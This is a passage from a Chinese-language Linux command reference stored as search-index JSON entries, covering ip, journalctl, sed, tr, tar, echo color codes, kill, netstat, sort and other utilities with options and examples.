00:1e:4f:c8:43:fc 接口的 MAC（硬件）地址 brd ff:ff:ff:ff:ff:ff 广播地址 inet 192.168.0.24/24 IPv4 地址 brd 192.168.0.255 广播地址 scope global 全局有效 dynamic enp0s25 地址是动态分配的 valid_lft 80866sec IPv4 地址的有效使用期限 preferred_lft 80866sec IPv4 地址的首选生存期 inet6 fe80::2c8e:1de0:a862:14fd/64 IPv6 地址 scope link 仅在此设备上有效 valid_lft forever IPv6 地址的有效使用期限 preferred_lft forever IPv6 地址的首选生存期 route 查看路由信息 说明: # 或者 ip r ip route # 后面可跟参数 show # 单纯显示路由表，也可以使用list. 默认就是此参数 add|del # 支持参数 IP|网域 # 可以使用192.168.170.0/24这样的网域或者单纯的ip via # 从那个gateway出去，不一定需要 dev # 由那个装置连接出去，需要 mtu # 额外设定MTU的数值 输出详解 lo：全称loopback，是回环地址，经常被分配到127.0.0.1地址上，用于本机通信，经过内核处理后直接返回，不会在任何网络中出现。 eth0：网卡名，如果有多块网卡，会有多个eth 或其它名称。 link/ether：这个是MAC地址，唯一的，一块网卡一个MAC。 inet：网卡上绑定的IP地址，通常所说的IPV4，一块网卡可以绑定多个IP地址。在绑定IP地址时注意：windows主机会提示IP地址冲突，而linux主机无任何提示，在添加新的IP地址时务必检测一下新地址是否和原有地址冲突，避免造成访问不可用。常用检测命令：ping或arping IP； inet6：IPV6地址，暂时没有，预留。 网络设备状态标识：<BROADCAST,MULTICAST,UP,LOWER_UP> UP：网卡处于启动状态。 BROADCAST：网卡有广播地址，可以发生广播包。 MULTICAST：网卡可以发生多播包。 LOWER_UP：L1是启动的，即网线是插着的。 <BROADCAST,MULTICAST,UP,LOWER_UP 这个配置串告诉我们: BROADCAST 该接口支持广播 MULTICAST 该接口支持多播 UP 网络接口已启用 LOWER_UP 网络电缆已插入，设备已连接至网络 列出的其他值也告诉了我们很多关于接口的知识，但我们需要知道 brd 和 qlen 这些词代表什么意思。 所以，这里显示的是上面展示的 ip 信息的其余部分的翻译: mtu 1500 最大传输单位（数据包大小）为1,500字节 qdisc pfifo_fast 用于数据包排队 state UP 网络接口已启用 group default 接口组 qlen 1000 传输队列长度 link/ether 00:1e:4f:c8:43:fc 接口的 MAC（硬件）地址 brd ff:ff:ff:ff:ff:ff 广播地址 inet 192.168.0.24/24 IPv4 地址 brd 192.168.0.255 广播地址 scope global 全局有效 dynamic enp0s25 地址是动态分配的 valid_lft 80866sec IPv4 地址的有效使用期限 preferred_lft 80866sec IPv4 地址的首选生存期 inet6 fe80::2c8e:1de0:a862:14fd/64 IPv6 地址 scope link 仅在此设备上有效 valid_lft forever IPv6 地址的有效使用期限 preferred_lft forever IPv6 地址的首选生存期 例: root@6378b4ca047d:/# ip address show to 172.17.0.3/16 76: eth0@if77: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default link-netnsid 0 inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-IP.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-IP.html"},{"title":"journalctl","text":"在 systemd 下, 内核和系统的信息都通过日志服务 systemd-journald.service (又名 journald )来记录， 放在 /var/log/journal 下的不变的二进制数据， 或放在\" /run/log/journal/ \"下的变化的二进制数据. 这些二进制日志数据，可以通过 journalctl 命令来访问。 例如，你可以显示从最后一次启动以来的日志，按如下所示: journalctl -b 操作 命令片段 查看从最后一次启动开始的系统服务和内核日志 \"journalctl -b --system\" 查看从最后一次启动开始的当前用户的服务日志 \"journalctl -b --user\" 查看从最后一次启动开始的 \"$unit\" 工作日志 \"journalctl -b -u $unit\" 查看从最后一次启动开始的 \"$unit\"的工作日志 (\"tail -f\" 式样) \"journalctl -b -u $unit -f\"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Journalctl.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Journalctl.html"},{"title":"mv","text":"为文件或目录改名、或将文件或目录移入其它位置","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-MV.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-MV.html"},{"title":"modinfo","text":"显示 Linux 内核模块信息","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Modinfo.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Modinfo.html"},{"title":"sed","text":"流式文本编辑器 利用脚本来处理文本文件。 sed 可依照脚本的指令来处理、编辑文本文件。 Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。 语法: sed [-hnV][-e<script>][-f<script文件>][文本文件] 选项参数 -n , --quiet , --silent 仅显示处理后的结果 -e <script> , --expression= <script> 指定sed编辑命令. 以选项中指定的script来处理输入的文本文件 -i 直接修改读取的文件内容，而不是输出到终端。 -f <script> , --file= <script> 以选项中指定的script文件来处理输入的文本文件. 直接将 sed 的动作写在一个文件内， -f filename 则可以运行 filename 内的 sed 动作； -r sed 的动作支持的是延伸型正规表示法的语法。(默认是基础正规表示法语法) -h , --help 显示帮助。 -V , --version 显示版本信息 文本操作方式 流式文本编辑器: a\\ # 在当前行下面插入文本。 i\\ # 在当前行上面插入文本。 c\\ # 把选定的行改为新的文本。 d # 删除，删除选择的行。 D # 删除模板块的第一行。 s # 替换指定字符. 通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g h # 拷贝模板块的内容到内存中的缓冲区。 H # 追加模板块的内容到内存中的缓冲区。 g # 获得内存缓冲区的内容，并替代当前模板块中的文本。 表示行内全面替换。 G # 获得内存缓冲区的内容，并追加到当前模板块文本的后面。 l # 列表不能打印字符的清单。 n # 读取下一个输入行，用下一个命令处理新的行而不是用第一个命令。 N # 追加下一个输入行到模板块后面并在二者间嵌入一个新行，改变当前行号码。 p # 打印模板块的行。通常 p 会与参数 sed -n 一起运行 P # (大写) 打印模板块的第一行。 q # 退出Sed。 b lable # 分支到脚本中带有标记的地方，如果分支不存在则分支到脚本的末尾。 r file # 从file中读行。 t label # if分支，从最后一行开始，条件一旦满足或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾。 T label # 错误分支，从最后一行开始，一旦发生错误或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾。 w file # 写并追加模板块到file末尾。 表示把行写入一个文件。 W file # 写并追加模板块的第一行到file末尾。 ! # 表示后面的命令对所有没有被选定的行发生作用。 = # 打印当前行号码。 # # 把注释扩展到下一个换行符以前。 x # 表示互换模板块中的文本和缓冲区中的文本。 y # 表示把一个字符翻译为另外的字符（但是不用于正则表达式） \\1 # 子串匹配标记 & # 已匹配字符串标记 $ # 可表示最后一行, 支持用 $-1 来表示倒数第二行等... 技巧 可以sed加文件名: sed \":a;N;s/\\n//g;ta\" a.txt sed是按行处理文本数据的，每次处理一行数据后，都会在行尾自动添加trailing newline，其实就是行的分隔符即换行符。 sed元字符集: &#94; # 匹配行开始，如：/&#94;sed/匹配所有以sed开头的行。 $ # 匹配行结束，如：/sed$/匹配所有以sed结尾的行。 . # 匹配一个非换行符的任意字符，如：/s.d/匹配s后接一个任意字符，最后是d。 * # 匹配0个或多个字符，如：/*sed/匹配所有模板是一个或多个空格后紧跟sed的行。 [] # 匹配一个指定范围内的字符，如/[ss]ed/匹配sed和Sed。 [&#94;] # 匹配一个不在指定范围内的字符，如：/[&#94;A-RT-Z]ed/匹配不包含A-R和T-Z的一个字母开头，紧跟ed的行。 \\(..\\) # 匹配子串，保存匹配的字符，如s/\\(love\\)able/\\1rs，loveable被替换成lovers。 & # 保存搜索字符用来替换其他字符，如s/love/ **&** /，love这成 **love** 。 \\< # 匹配单词的开始，如:/\\<love/匹配包含以love开头的单词的行。 \\> # 匹配单词的结束，如/love\\>/匹配包含以love结尾的单词的行。 x\\{m\\} # 重复字符x，m次，如：/0\\{5\\}/匹配包含5个0的行。 x\\{m,\\} # 重复字符x，至少m次，如：/0\\{5,\\}/匹配至少有5个0的行。 x\\{m,n\\} # 重复字符x，至少m次，不多于n次，如：/0\\{5,10\\}/匹配5~10个0的行。 sed替换标记: g # 表示行内全面替换。 p # 表示打印行。 w # 表示把行写入一个文件。 x # 表示互换模板块中的文本和缓冲区中的文本。 y # 表示把一个字符翻译为另外的字符（但是不用于正则表达式） \\1 # 子串匹配标记 & # 已匹配字符串标记 例 删除\"234\"的行（整行删除）: echo -e \"123\\n234\\n342\\n\" | sed '/&#94;234$/d' 删除第二行: echo -e \"123\\n234\\n342\\n\" | sed 2d 替换空格: echo -e \"123\\n12\\n23\" | sed \":a;N;s/\\n//g;ta\" # tr \"\\n\" \"\" 就好了 # N是把下一行加入到当前的hold space模式空间里，使之进行后续处理，最后sed会默认打印hold space模式空间里的内容。也就是说，sed是可以处理多行数据的。 # :a和ta是配套使用，实现跳转功能。t是test测试的意思。 # 另外，还有:a和ba的配套使用方式，也可以实现跳转功能。b是branch分支的意思。 打印4-10行: sed -n '4,10p' file 仅匹配字符串: echo \"abcde\" | sed 's/a\\(.*\\)e/\\1/g' # bcd (结果) # \\(...\\) 表示仅匹配子串 # \\1 表示子串 已匹配结果: echo 'qwer' | sed 's/\\w\\+/\"&\"/g' # \"qwer\" 替换单引号 原因暂时没有查到，只找到说加$可以转义bash: sed $'s/\\'//g' 注解 sed后面可以不用三个斜杠，只要是三个相同的字符就行，这一点就比较神奇。 打印文件以hhh开始的所有行: sed -n '/hhh/,\\$p' $file 删除空行: sed '/&#94;\\s*$/d' $file 在第一行插入一行qwe(Mac的sed不支持使用i): echo 123 | sed '1 i\\qwe'","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SED.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SED.html"},{"title":"stat","text":"查看文件的状态","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-STAT.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-STAT.html"},{"title":"tr","text":"tr命令 可以对来自标准输入的字符进行替换、压缩和删除。 语法: tr(选项)(参数) 选项 -c , --complerment 取代所有不属于第一字符集的字符； -d , --delete 删除所有属于第一字符集的字符； -s , --squeeze-repeats 把连续重复的字符以单独一个字符表示； -t , --truncate-set1 先删除第一字符集较第二字符集多出的字符。 参数 字符集1 指定要转换或删除的原字符集。 当执行转换操作时，必须使用参数 \"字符集2\" 指定转换的目标字符集。 但执行删除操作时，不需要参数 \"字符集2\"； 字符集2 指定要转换成的目标字符集 字符集合的范围: \\NNN 八进制值的字符 NNN (1 to 3 为八进制值的字符) \\\\ 反斜杠 \\a Ctrl-G 铃声 \\b Ctrl-H 退格符 \\f Ctrl-L 走行换页 \\n Ctrl-J 新行 \\r Ctrl-M 回车 \\t Ctrl-I tab键 \\v Ctrl-X 水平制表符 CHAR1-CHAR2 ：字符范围从 CHAR1 到 CHAR2 的指定，范围的指定以 ASCII 码的次序为基础，只能由小到大，不能由大到小。 [CHAR*] ：这是 SET2 专用的设定，功能是重复指定的字符到与 SET1 相同长度为止 [CHAR*REPEAT] ：这也是 SET2 专用的设定，功能是重复指定的字符到设定的 REPEAT 次数为止(REPEAT 的数字采 8 进位制计算，以 0 为开始) [:alnum:] ：所有字母字符与数字 [:alpha:] ：所有字母字符 [:blank:] ：所有水平空格 [:cntrl:] ：所有控制字符 [:digit:] ：所有数字 [:graph:] ：所有可打印的字符(不包含空格符) [:lower:] ：所有小写字母 [:print:] ：所有可打印的字符(包含空格符) [:punct:] ：所有标点字符 [:space:] ：所有水平与垂直空格符 [:upper:] ：所有大写字母 [:xdigit:] ：所有 16 进位制的数字 [=CHAR=] ：所有符合指定的字符(等号里的 CHAR，代表你可自订的字符) 例如 换行替换为空格: tr '\\n' ' ' 删除重复的换行: tr -s '\\n' 例: echo \"HELLO WORLD\" | tr 'A-Z' 'a-z' hello world","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Sudden.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Sudden.html"},{"title":"tac","text":"跟 /docs/操作系统/linux/linux指令/cat 相反 tac命令就是将文件反向输出(有缓冲)，刚好和cat输出相反。 语法格式: tac [参数] [文件] 常用参数 -b 在行前而非行尾添加分隔标志 -r 将分隔标志视作正则表达式来解析 -s 使用指定字符串代替换行作为分隔标志 --version 显示版本信息并退出 --help 显示此帮助信息并退出 参考实例 反向列出test.txt文件的内容: [root@linuxcool ~]# cat test.txt hello world hello linuxcool hello linuxprobe [root@linuxcool ~]# tac test.txt hello linuxprobe hello linuxcool hello world","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TAC.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TAC.html"},{"title":"tar","text":"常用几个: -zcvf 创建新包 -zxvf 解压包 -tf 查看包内文件列表 选项 -c , --create 建立新的备份文件 -C <dir> 切换工作目录，先进入指定目录再执行压缩/解压缩操作， -x , --extract , --get 从归档文件中提取文件，可以搭配-C（大写）在特定目录解开 -z , --gzip , --ungzip 通过gzip指令压缩/解压缩文件，文件名最好为*.tar.gz -v , --verbose 显示指令执行过程 -t 查看打包好的tar包内容(不解包查看) -f <tar_file> , --file= <tar_file> 指定备份文件； -d 记录文件的差别； -r 添加文件到已经压缩的文件； -u 添加改变了和现有的文件到已经存在的压缩文件； -j 通过bzip2指令压缩/解压缩文件，文件名最好为*.tar.bz2； -l 文件系统边界设置； -k 保留原有文件不覆盖； -m 保留文件不被覆盖； -w 确认压缩文件的正确性； --exclude= <exclude_list> 排除不打包文件, 支持通配符 -p , --same-permissions 保留原来的文件权限与属性, 这里指的是文件的特殊属性, 因为tar默认就会恢复文件权限与属性 -P , --absolute-names 使用文件名的绝对路径，不移除文件名称前的\"/\"号 --owner= user1 指定解压后的属主, 实际测试没用 --group= group1 指定解压后的属组, 实际测试没用 -N <日期格式> , --newer= <日期时间> 只将较指定日期更新的文件保存到备份文件里； --remove-files 归档/压缩之后删除源文件 -–strip-components=NUMBER 解压时从文件名中清除 NUMBER 个引导部分, 即抛弃前NUMBER个路径 全部 -A , --catenate 新增文件到以存在的备份文件； -B 设置区块大小； -c , --create 建立新的备份文件； -C <目录> 切换工作目录，先进入指定目录再执行压缩/解压缩操作，可用于仅压缩特定目录里的内容, 解压缩到特定目录； -d 记录文件的差别； -x , --extract , --get 从归档文件中提取文件，可以搭配-C（大写）在特定目录解开， 需要注意的是-c、-t、-x不可同时出现在一串命令中； -t , --list 列出备份文件的内容； -z , --gzip , --ungzip 通过gzip指令压缩/解压缩文件，文件名最好为*.tar.gz； -Z , --compress , --uncompress 通过compress指令处理备份文件； -f <备份文件> , --file= <备份文件> 指定备份文件； -v , --verbose 显示指令执行过程； -r 添加文件到已经压缩的文件； -u 添加改变了和现有的文件到已经存在的压缩文件； -j 通过bzip2指令压缩/解压缩文件，文件名最好为*.tar.bz2； -v 显示操作过程； -l 文件系统边界设置； -k 保留原有文件不覆盖； -m 保留文件不被覆盖； -w 确认压缩文件的正确性； -p , --same-permissions 保留原来的文件权限与属性； -P , --absolute-names 使用文件名的绝对路径，不移除文件名称前的\"/\"号； -N <日期格式> , --newer= <日期时间> 只将较指定日期更新的文件保存到备份文件里； --exclude= <范本样式> 排除符合范本样式的文件； --remove-files 归档/压缩之后删除源文件 如: tar zxf xxx.tar.gz -–strip-components=1 假定原包内文件为: a/b/c , 使用 -–strip-components=1 后, 解压后的内容仅有 b/c (去除了前一层目录) 删除归档中文件 只能删除tar包. gz不行(Mac下不行): tar --delete -vf xxx.tar need_delete_file tar默认行为说明 关于tar保留文件权限与属性的说明: tar默认会尽量保留普通的文件权限与属性(如所有者, 权限号), 不能保留特殊的属性 特殊的权限需要使用 -p 才能保留, 如设备文件、符号链接、ACLs等 关于报错： file changed as we read it 是因为在打包的过程中文件发生了变化，所以导致报错，但是打包依然进行并且有效。 在使用tar命令时加上--warning=no-file-changed参数即可不输出报错。 关于报错 tar: write error 暂时不知道原因, 可能同一个脚本使用不同的渠道执行就会有这个报错, 搜了一下也没搜到 暂时发现, 去掉v参数或者重定向到null可以解决 tar相关权限变化 默认情况下, 压缩文件时的用户权限变化： 以超级用户（root）身份运行tar命令, 保留所有文件和目录的所有权和权限信息 以普通用户身份运行tar命令，则压缩后的归档文件将会保留文件的所有权信息, 但不会包含文件的权限信息 解压缩文件时的用户权限变化： 以超级用户身份运行tar命令来解压缩归档文件, 则解压后的文件将保持其原始的所有权和权限信息。 以普通用户身份运行tar命令来解压缩归档文件 则解压后的文件将被赋予该用户的所有权，并且文件权限可能会被设置为默认值（通常是较为宽松的权限）. 文件所有权指, 属主属组 文件权限指, 755这种","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TAR.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TAR.html"},{"title":"cat","text":"用于连接文件并打印到标准输出设备上， 由第一行开始显示内容，并将所有内容输出","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-cat.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-cat.html"},{"title":"echo","text":"回显，就是显示正在执行的批处理命令及执行的结果等 选项 echo选项 -n: 不换行输出 -e: 激活转义字符。使用-e选项时，若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出： \\a 发出警告声； \\b 删除前一个字符； \\c 最后不加上换行符号； \\f 换行但光标仍旧停留在原来的位置； \\n 换行且光标移至行首； \\r 光标移至行首，但不换行； \\t 插入tab； \\v 与\\f相同； \\\\ 插入\\字符； \\nnn 插入nnn（八进制）所代表的ASCII字符； 技巧 在脚本中echo自带转义功能 使用 echo -e \"\\e[1;36m ${ _strs } \\e[0m\\n\" 技巧 例子的这种情况官方建议使用 ./printf 对于颜色输出而言, echo的 \\e 和 \\033 一个效果 echo vs /bin/echo echo 是shell内置命令 /bin/echo 是可执行文件 通常来说，内建命令会比外部命令执行得更快，执行外部命令时不但会触发磁盘 I/O， 还需要 fork 出一个单独的进程来执行，执行完成后再退出。 而执行内建命令相当于调用当前 Shell 进程的一个函数。 目前来说遇到的一些区别: /bin/echo 参数触发 Argument list too long的临界点是 131072 echo 暂时没测试到有限制 输出带颜色 颜色表见 /docs/操作系统/linux/概念性/颜色表与代码表 格式: echo -e \"\\033[字背景颜色;字体颜色m字符串\\033[0m\" 例如 打印红色输出: echo -e \"\\e[1;31m 内容 \\e[0m\" #\\e[1;31m 将颜色设置为红色 #\\e[0m 将颜色重新置回 #颜色码：重置=0，黑色=30，红色=31，绿色=32，黄色=33，蓝色=34，洋红=35，青色=36，白色=37 ANSI控制码的说明: \\33[0m 关闭所有属性 \\33[1m 设置高亮度 \\33[4m 下划线 \\33[5m 闪烁 \\33[7m 反显 \\33[8m 消隐 \\33[30m -- \\33[37m 设置前景色 \\33[40m -- \\33[47m 设置背景色 \\33[nA 光标上移n行 \\33[nB 光标下移n行 \\33[nC 光标右移n行 \\33[nD 光标左移n行 \\33[y;xH设置光标位置 \\33[2J 清屏 \\33[K 清除从光标到行尾的内容 \\33[s 保存光标位置 \\33[u 恢复光标位置 \\33[?25l 隐藏光标 \\33[?25h 显示光标 #\\e和\\033一个效果","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-echo.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-echo.html"},{"title":"exec","text":"用于调用并执行指令的命令。 exec命令通常用在shell脚本程序中，可以调用其他的命令。 如果在当前终端中使用命令，则当指定的命令执行完毕后会立即退出终端。 语法: exec(选项)(参数) 选项 -c 在空环境中执行指定的命令。 如: exec -c echo Linux C++ # 调用命令执行，执行完毕后退出","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-exec.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-exec.html"},{"title":"groupadd","text":"用于创建一个新的工作组","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-groupadd.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-groupadd.html"},{"title":"gunzip","text":"用来解压缩文件（等价于gzip -d） 相关指令 gzip","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-gunzip.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-gunzip.html"},{"title":"ifcofig","text":"配置和显示Linux系统网卡的网络参数","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ifconfig.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ifconfig.html"},{"title":"kill","text":"类似的指令: /docs/操作系统/linux/linux指令/killall /docs/操作系统/linux/linux指令/pkill 发送信号 Linux kill 命令用于删除执行中的程序或工作。 kill 可将指定的信息送至程序。 预设的信息为 SIGTERM(15)，可将指定程序终止。 若仍无法终止该程序，可使用 SIGKILL(9) 信息尝试强制删除程序。 程序或工作的编号可利用 ps 指令或 jobs 指令查看。 语法: kill [-s <信息名称或编号>][程序] 或 kill [-l <信息编号>] 参数说明: -l <信息编号> 若不加<信息编号>选项，则 -l 参数会列出全部的信息名称。 -s <信息名称或编号> 指定要送出的信息。 [程序] [程序]可以是程序的PID或是PGID，也可以是工作编号。 使用 kill -l 命令列出所有可用信号 最常用的信号是: 1 (HUP)：重新加载进程。 9 (KILL)：杀死一个进程。 15 (TERM)：正常停止一个进程。 发送SIGHUP信号，可以使用一下信号: kill -HUP pid 彻底杀死进程: kill -9 123456 # 或者 kill -KILL 123456 杀死指定用户所有进程: kill -9 $(ps -ef | grep hnlinux) //方法一 过滤出hnlinux用户进程 kill -u hnlinux //方法二","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-kill.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-kill.html"},{"title":"killall","text":"相似的指令: /docs/操作系统/linux/linux指令/pkill /docs/操作系统/linux/linux指令/kill 使用进程的名称来杀死一组进程 Linux killall 用于杀死一个进程，与 kill 不同的是它会杀死指定名字的所有进程。 kill 命令杀死指定进程 PID，需要配合 ps 使用，而 killall 直接对进程对名字进行操作，更加方便。 语法: killall [选项] name 参数说明: name ： 进程名 选项包含如下几个参数: -e | --exact ： 进程需要和名字完全相符 -I | --ignore-case ：忽略大小写 -g | --process-group ：结束进程组 -i | --interactive ：结束之前询问 -l | --list ：列出所有的信号名称 -q | --quite ：进程没有结束时，不输出任何信息 -r | --regexp ：将进程名模式解释为扩展的正则表达式。 -s | --signal ：发送指定信号 -u | --user ：结束指定用户的进程 -v | --verbose ：显示详细执行过程 -w | --wait ：等待所有的进程都结束 -V |--version ：显示版本信息 --help ：显示帮助信息 实例, 结束所有的 php-fpm 进程: killall -9 php-fpm","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-killLALL.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-killLALL.html"},{"title":"lsb_release","text":"如果没有, 使用以下指令安装: apt install lsb-core LSB是Linux Standard Base的缩写, Isb_release命令用来显示LSB和特定版本的相关信息(查看当前系统的发行版信息)。 语法: lsb_release [参数] 选项参数 -i 显示系统名称简写 -v 显示lsb版本信息 -d 显示系统全称和版本号 -r 显示版本号 -a 显示LSB所有信息 -h 查看lsb_release支持的所有参数 无参数时默认加上-v 参数。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-lsb_release.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-lsb_release.html"},{"title":"man","text":"man可以查看命令的用法 一般可以先使用\"whatis ‘命令'\"来查看命令相关信息， 再使用\"man ‘命令'\"来查看命令的具体使用 翻屏: 向后翻一屏：space(空格键) 向前翻一屏：b 向后翻一行：Enter(回车键) 向前翻一行：k 按键与用处: 按键 用处 空格键 向下翻一页。 [Page Down] 向下翻一页。 [Page Up] 向上翻一页。 [HOME] 直接前往首页。 [END] 直接前往尾页。 /关键词 从上至下搜索某个关键词,如\"/linux\"。 ?关键词 从下至上搜索某个关键词,如\"?linux\"。 n 定位到下一个搜索到的关键词。 N 定位到上一个搜索到的关键词。 q 退出帮助文档。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-man.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-man.html"},{"title":"netstat","text":"Ubuntu安装: apt install net-tools -y 注解 net-tools包含arp, ifconfig, netstat, rarp, nameif and route命令，如果使用这些命令报错，可以尝试安装。 功能 查看网络状态 Linux netstat 命令用于显示网络状态。利用 netstat 指令可让你得知整个 Linux 系统的网络情况。 使用: netstat [-acCeFghilMnNoprstuvVwx][-A<网络类型>][--ip] 选项参数 netstat选项参数 选项 含义 -a/--all 显示所有连线中的Socket -n/--numeric 以ip形式显示当前建立的有效连接和端口.直接使用IP地址，而不通过域名服务器 -u/--udp 显示UDP传输协议的连线状况。 -t/--tcp 显示TCP传输协议的连线状况。 -p/--programs 显示对应PID与程序名. 显示正在使用Socket的程序识别码和程序名称。 A<网络类型>或--<网络类型> 列出该网络类型连线中的相关地址。 -c/--continuous 持续列出网络状态。 -C/--cache 显示路由器配置的快取信息。 -e/--extend 显示网络其他相关信息。 -F/--fib 显示路由缓存。 -g/--groups 显示多重广播功能群组组员名单。 -h/--help 在线帮助。 -i --interfaces 显示网络界面信息表单。 -l/--listening 显示监控中的服务器的Socket。 -M/--masquerade 显示伪装的网络连线。 -N/--netlink/--symbolic 显示网络硬件外围设备的符号连接名称。 -o/--timers 显示计时器。 -r/--route 显示Routing Table。 -s/--statistics 显示网络工作信息统计表。 -v/--verbose 显示指令执行过程。 -V/--version 显示版本信息。 -w/--raw 显示RAW传输协议的连线状况。 -x/--unix 此参数的效果和指定\"-A unix\"参数相同。 --ip/--inet 此参数的效果和指定\"-A inet\"参数相同。 注解 常用: netstat -anutp 常用: #列出所有端口 (包括监听和未监听的) netstat -a #列出所有端口 netstat -at #列出所有tcp端口 netstat -au #列出所有udp端口 #列出所有处于监听状态的 Socket netstat -l #只显示监听端口 netstat -lt #只列出所有监听 tcp 端口 netstat -lu #只列出所有监听 udp 端口 netstat -lx #只列出所有监听 UNIX 端口 netstat -antup #显示所有 及 占用程序名 内容解释: Proto 该联机的封包协议 Recv-Q 非由用户程序连接所复制而来的总 bytes Send-Q 由远程主机所传送而来，但不具有ACK标志的总bytes数，意指主动联机SYN或其他标志的封包所占的bytes数 Local Address 本地地址 Foreign Address 远程主机地址 stat 状态栏，有以下 ESTABLISED 已建立的联机的状态 SYNC_SENT 发出主动联机的联机封包 SYNC_RECV 接收到一个要求联机的主动联机封包 FIN_WAIT1 该插槽服务socket已中断，该联机正在断线中 FIN_WAIT2 该联机已挂断，但正在等待对方主机响应断线确认的封包 TIME_WAIT 该联机已挂断，但socket还在网络上等待结束 LISTEN 通常在服务的监听port，可使用 -l查询","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-netStat.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-netStat.html"},{"title":"route","text":"显示并设置Linux内核中的网络路由表，route命令设置的路由主要是静态路由","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-route.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-route.html"},{"title":"sort","text":"对文本内容以行为单位进行 ASCII 码排序, 默认按照升序进行排序 -n , --numeric-sort 根据数字排序 -r , --reverse 将结果倒序排列。 -k , --key= KEYDEF 通过一个key排序；KEYDEF给出位置和类型 就是指定排序的列号, 第几列, 支持多个, 按照指定的顺序 (默认第一行) -t <seq> 指定分隔符 -o <file> 将结果输出到指定文件 -b 忽略每行前面开始出的空格字符。 -c 检查文件是否已经按照顺序排序。 -d 排序时，处理英文字母、数字及空格字符外，忽略其他的字符。 -f 忽略大小写. 排序时，将小写字母视为大写字母。 -i 排序时，除了040至176之间的ASCII字符外，忽略其他的字符。 -m 将几个排序好的文件进行合并。 -M 将前面3个字母依照月份的缩写进行排序。 -n 依照数值的大小排序。 -u 对结果去重. 意味着是唯一的(unique)，输出的结果是去完重了的。 -t <分隔字符> 指定排序时所用的栏位分隔字符。 -o <输出文件> 将排序后的结果存入指定的文件。 其他: +<起始栏位>-<结束栏位> 以指定的栏位来排序，范围由起始栏位到结束栏位的前一栏位。 如指定以第六, 七列的顺序排序(写一起之支持单数行号): ls -lh | sort -k6 -k7 # ls -lh | sort -k67 还以精确到列的第几个字符, 如第六列的第一个字符(默认行为): ls -lh | sort -k6.1","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-sort.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-sort.html"},{"title":"ls","text":"查看目录文件信息 -l 详细信息 -t 按时间排序 -i 输出innode信息 --block-size --block-size=m 以M为单位 --block-size=G 以G为单位 ls -l 输出的第一个字符列表 输出列含义 字符 说明 普通文件 d 目录 l 符号链接 c 字符设备节点 b 块设备节点 p 命名管道 s 套接字","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-teacher.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-teacher.html"},{"title":"top","text":"显示或管理执行中的程序，实时动态地查看系统的整体运行情况，是一个综合了多方信息监测系统性能和运行信息的实用工具。 选项 -b 以批处理模式操作； -c 显示完整的治命令； -d 屏幕刷新间隔时间； -I 忽略失效过程； -s 保密模式； -S 累积模式； -i <时间> 设置间隔时间； -u <用户名> 指定用户名； -p <进程号> 指定进程； -n <次数> 循环显示的次数。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-top.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-top.html"},{"title":"traceroute","text":"Linux traceroute命令用于显示数据包到主机间的路径。 